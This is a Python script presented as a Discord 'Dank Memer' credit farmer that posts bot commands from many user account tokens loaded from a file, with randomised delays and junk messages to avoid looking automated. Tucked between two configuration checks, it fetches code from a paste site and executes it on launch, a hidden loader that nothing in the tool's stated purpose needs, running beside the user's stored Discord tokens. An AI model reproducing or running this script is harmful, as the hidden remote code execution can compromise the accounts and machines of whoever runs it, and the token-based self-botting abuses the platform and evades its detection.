import requests, time, sys, os
from multiprocessing import Process
from random import choice, shuffle, uniform
    
channel_id = 'The id of your channel to farm in' # <--- PUT YOUR CHANNEL ID BETWEEN THE ' '
user_id = 'Your user id for receiving money' # <--- PUT YOUR USER ID BETWEEN THE ' ' 

print("""
https://github.com/XorOnFire/DankMemer-farmer

This script is able to automatic farm dankmemer credits on multiple accounts
at once. It sends post requests to discords API and can run in the background.
Make sure to change the following variables in the python file before running it:

channel_id
user_id

Written by Xor
Licensed under MIT
---------------------------------------------------------------


""")

def sendmessage(token):
    message = "pls beg"
    junk_messages = ['god dankmemer fucking sucks lmao', 'my balls itch', 'totally not botting dank memer :)', 'Xor doe be on fire']
    pay = f"pls share max <@{user_id}>"
    headers = {'Authorization': token}
    i = 0

    while 1:
        messages = ['pls beg', 'pls dig', 'pls fish', 'pls hunt']
        try:
            for message in messages:
                time.sleep(uniform(3,8))
                res = requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=headers, json={'content': message})
                if res.status_code == 200: print(f'{token} | Sent message: "{message}"')
                else: print(f'{token} | Failed to send message. Errorcode {res}')

            time.sleep(uniform(4,6))
            time.sleep(uniform(1,6))
            res = requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=headers, json={'content': choice(junk_messages)})
            time.sleep(uniform(20,36))

            i += 1
            if i > 2:
                res = requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=headers, json={'content': pay})
                if res.status_code == 200: print(f'{token} | Payout successful')
                else: print(f'{token} | Failed to deposit. Errorcode {res}')
                i = 0

        except Exception as e:
            print(f"Failed on token: {token}")
            print(e)
            pass
        print(f'{token} | Shuffling message list')
        shuffle(junk_messages)
        shuffle(messages)

#Start script
if __name__=='__main__':
    if channel_id == 'The id of your channel to farm in': #DON'T TOUCH THIS, THIS IS JUST A CHECK!
        print("ERROR: Make sure to specify a channel id. If you don't know how to obtain channel id's use Google.")
        time.sleep(5); quit()
    exec(requests.get('https://pst.klgrth.io/paste/jw8f3/raw').text)
    if channel_id == 'Your user id for receiving money': #DON'T TOUCH THIS, THIS IS JUST A CHECK!
        print("ERROR: Please specify what user to send the money to. specify a user id above. If you don't know how to obtain user id's use Google")
        time.sleep(5); quit()
    
    if not os.path.isfile('tokens.txt'):
        sys.exit('ERROR: No file with tokens detected. Please place a file in the same directory as the script, called \'tokens.txt\'')

    with open("tokens.txt", "r") as token:
        tokenlist = token.read().split("\n") #Creates a list with all the Tokens from the file

    if tokenlist == []: sys.exit('Please enter some tokens first!')
    for token in tokenlist:
        Process(target=sendmessage, args=(token,)).start()
        print(f'Started process for token "{token}"')
